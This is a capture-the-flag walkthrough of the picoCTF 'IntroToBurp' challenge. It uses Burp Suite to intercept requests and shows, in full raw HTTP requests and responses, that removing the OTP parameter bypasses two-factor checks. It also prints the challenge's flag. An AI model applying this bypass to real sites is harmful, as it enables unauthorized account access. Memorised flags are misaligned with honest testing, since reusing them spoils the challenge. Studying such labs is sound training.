# picoGym Level 419: IntroToBurp
Source: https://play.picoctf.org/practice/challenge/419

## Goal
Try here to find the flag:
  http://titan.picoctf.net:57765/

## What I learned
```
Web Exploitation w/ Burp Suite
Burp Suite
Bypass OTP
  Replaced OTP with text and response was still “Invalid OTP” means server not properly validating OTP input
  Remove OTP check
```

## Solution
```
https://webshell.picoctf.org/

Burp Suite:
Temporary Project in memory (Next) → Use Burp defaults (Start Burp)
# Optional: Foxy Proxy on Browser of Choice
Proxy (Open Browser)
  http://titan.picoctf.net:57765/ ⌨️
Proxy (Intercept on)
Browser (Fill form) → Register

# Look at POST Request (Nothing special) → Proxy (Forward)
POST / HTTP/1.1
Host: titan.picoctf.net:57765
Content-Length: 176
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:57765
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57765/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJjc3JmX3Rva2VuIjoiNzE5MThmODg2OGI4YTJkZjg4YTdkNDJjZTU1NGJhNWMwOTM1NDA4MCJ9.aKcoCQ.gWNmo9sojn-JRRXIB7S5ddLmme4
Connection: keep-alive

csrf_token=IjcxOTE4Zjg4NjhiOGEyZGY4OGE3ZDQyY2U1NTRiYTVjMDkzNTQwODAi.aKcoCQ.LExvZZHUTjhN_CvskB4LpjPjoeQ&full_name=a&username=a&phone_number=123&city=a&password=a&submit=Register

# 2fa authentication (Vulnerability)
Browser: 1 Submit ⌨️
# Put POST REQUEST in Repeater and mess with otp
# Note if delete otp statement can bypass check

# Normal POST Request
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:57765
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:57765
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57765/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsKAyEQRO_iOgt1dOzJZaTVloTMqPghhJC7x8CQXdUr6r2Zv_cXuzJkF-ZbjbbnB6UJjNgERIAVHKAMM6EJSnrSWjnUnm-LVhz4_MWx7zbhQacn9_ITGOCrmLVga89cw7mWW05k0zgc1YmEXCYcjerf8PkC2MUr3Q.aKcpOQ.HMwKnFhMJChjhVsA2q09kt4zOF0
Connection: keep-alive

otp=1 👀

# Normal Response
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 21 Aug 2025 14:16:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 11
Vary: Cookie
Connection: close

Invalid OTP

# Modified POST Request
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:57765
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:57765
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57765/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsKAyEQRO_iOgt1dOzJZaTVloTMqPghhJC7x8CQXdUr6r2Zv_cXuzJkF-ZbjbbnB6UJjNgERIAVHKAMM6EJSnrSWjnUnm-LVhz4_MWx7zbhQacn9_ITGOCrmLVga89cw7mWW05k0zgc1YmEXCYcjerf8PkC2MUr3Q.aKcpOQ.HMwKnFhMJChjhVsA2q09kt4zOF0
Connection: keep-alive

# Response
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 21 Aug 2025 14:18:59 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Vary: Cookie
Connection: close

Welcome, a you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a} 🔐
```

## Flag
picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a} 

## Continue
[Continue](./picoGym0274.md)